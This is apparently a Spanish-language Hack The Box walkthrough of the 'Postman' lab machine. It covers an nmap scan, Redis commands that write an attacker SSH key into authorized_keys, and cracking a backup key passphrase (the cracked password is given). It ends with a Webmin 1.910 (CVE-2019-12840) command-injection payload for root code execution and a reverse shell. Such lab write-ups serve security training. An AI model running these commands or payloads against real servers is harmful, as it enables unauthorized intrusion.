# Postman ![Avatar](https://www.hackthebox.eu/storage/avatars/ad38e890e4e93afce51118bec4b9f48b_thumb.png)
## Initial Scan
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```
## Enum
### Webmin
Este podría
### Redis
El servicio redis nos permite interaccionar con el sin ningun tipo de autenticación, abusaremos de esto para subir nuestra propia clave y obtener sesion en el servidor como redis , para ello ejecutaremos lo siguiente
```
:~/Current/HTB$ (echo -e "\n\n"; cat key_rsa.pub ; echo -e "\n\n") > key.txt
:~/Current/HTB$ cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
OK
:~/Current/HTB$ redis-cli -h 10.10.10.160
10.10.10.160:6379> GET ssh_key
"\n\n\nssh-rsa AAAAB3NzaC.............\n\n\n\n"
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```
Tras esto podemos logearnos en el sistema sin ningún problema como redis

## Privesc 
### Matt
Encontramos el siguiente archivo de backup
```
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```
Copiamos la clave y la traemos a nuestra máquina para poder crackear su clave, usamos ssh2john y crackeamos el hash, con ello veremos que la clave es la siguiente
```
computer2008     (second_key)
```
Con esta clave nos podremos logear como Matt, pero no desde el ssh directamente si no mediante su
### Root

Tras un rato buscand omaneras de hacer privesc recorde que habia un servicio webmin que no habiamos utilizado para nada, probamos las credenciales de Matt en el servicio y accedimos sin problema, busquemos alguna forma de escalar privilegios desde aquí, ya que el webmin ha sido invocado como root
```
Matt@Postman:/etc/webmin$ ps aux | grep webmin
root        695  0.0  3.2  95320 29536 ?        Ss   Sep06   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```
Desde el escaneo del principio sabemos la version de webmin, 1.910 esta version es vulnerable a el CVE 2019-12840, abusemos del mismo para obtener RCE como root, para ello podriamos usar alguno de los exploits disponibles para el CVE aunque en este caso vamos a hacerlo a mano para evitar los problemas con el certificado ssl de la página , para ello hacemos lo siguiente
1* Abrimos BurpSuite y mediante el proxy interceptamos una request a /package-updates/update.cgi
2* Para obtener la request que necesitamos vamos a System -> Software Packcage Mangamente -> Update -> Update selecteds
3* Añadir el siguiente payload al data en la request  
```
u=acl%2Fapt&u=$(COMANDO A EJECUTAR)
```
Con esto podemos conseguir obtener una reverse shell, si pasamos los filtros :v
